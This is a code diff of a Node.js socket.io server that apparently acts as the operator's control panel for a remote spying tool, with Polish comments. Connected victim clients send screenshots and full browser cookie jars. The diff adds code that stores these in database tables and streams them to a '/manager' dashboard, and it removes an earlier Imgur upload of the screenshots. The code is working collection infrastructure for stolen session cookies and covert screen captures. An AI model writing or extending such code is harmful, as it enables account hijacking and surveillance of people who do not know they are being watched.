@@ -2,17 +2,21 @@ const cache = require('../cache');
 const fs = require('fs');
 const path = require('path');
 
+const {Client, Cookie, Screenshoot} = require('../sequelize');
+
 module.exports = (namespace, sio) => {
     namespace.on('connection', socket => {
         console.log(`Client ${socket.id} connected`)
         let clients = cache.get('clients');
         clients.push(socket.id);
         cache.set('clients', clients);
-        //clients.push(socket.id);
         socket.join(socket.id);
+
+        // Dodajhmey do bazy
+        Client.create({sid: socket.id});
+
         sio.of('/manager').emit('client_connected', {client: socket.id})
         sio.of('/manager').emit('notification', {message: `Polaczono ${socket.id}`, pos: 'bottom-right', status: 'success'})
-        //clientNamespace.emit('screenshot');
 
         socket.on('disconnect', () => {
             //console.log(clients);
@@ -24,37 +28,21 @@ module.exports = (namespace, sio) => {
             sio.of('/manager').emit('notification', {message: `Rozlaczono ${socket.id}`, pos: 'bottom-right', status: 'danger'})
         })
 
-        socket.on('get_screenshoot', (data) => {
+        socket.on('get_screenshoot', async (data) => {
             console.log(data);
             const image = data.img
             const filename = data.filename
-            const ssDir = `public/screenshoots/${socket.id}`;
-            if (!fs.existsSync(ssDir)) {
-                fs.mkdirSync(ssDir)
-            }
-            fs.writeFile(path.join(ssDir, filename), image, (e) => {
+            const ssDir = `public/screenshoots/`;
+            fs.writeFile(path.join(ssDir, filename), image, async (e) => {
                 if (e) {
                     return console.log(e);
                 }
+                const client = await Client.findOne({where: {sid: data.clientId}});
+                await Screenshoot.create({
+                    filename: filename,
+                    ClientId: client.dataValues.id
+                })
                 console.log(`File ${filename} saved`);
-                const imgur = require('imgur');
-
-                imgur.setClientId(process.env.IMGUR_CLIENT_ID);
-                imgur.createAlbum()
-                    .then(function(json) {
-                        console.log(json);
-                        imgur.uploadFile(path.join(ssDir, filename), json.id)
-                            .then(function (json) {
-                                console.log(json.data.link);
-                            })
-                            .catch(function (err) {
-                                console.error(err.message);
-                            });
-                    })
-                    .catch(function (err) {
-                        console.error(err.message);
-                    });
-
             })
             sio.of('/manager').emit('ss_btn', {state: true})
         })
@@ -86,6 +74,29 @@ module.exports = (namespace, sio) => {
 
         socket.on("notification", (data) => {
             sio.of('/manager').emit('notification', {...data.notification})
+        })
+
+        socket.on('cookies', async (data) => {
+            const client = await Client.findOne({where: {sid: data.clientId}});
+            console.log(client);
+            for (const [key, value] of Object.entries(data.cookies))
+            {
+                await Cookie.create({
+                    name: value.name,
+                    value: value.value,
+                    domain: value.domain,
+                    path: value.path,
+                    secure: value.secure,
+                    expires: value.expires,
+                    ClientId: client.dataValues.id
+                })
+            }
+            sio.of('/manager').emit('cookies', {cookies: data.cookies})
+        })
+
+        socket.on("progress", (data) => {
+            sio.of('/manager').emit('progress', data)
+            console.log(data);
         })
     })
 }
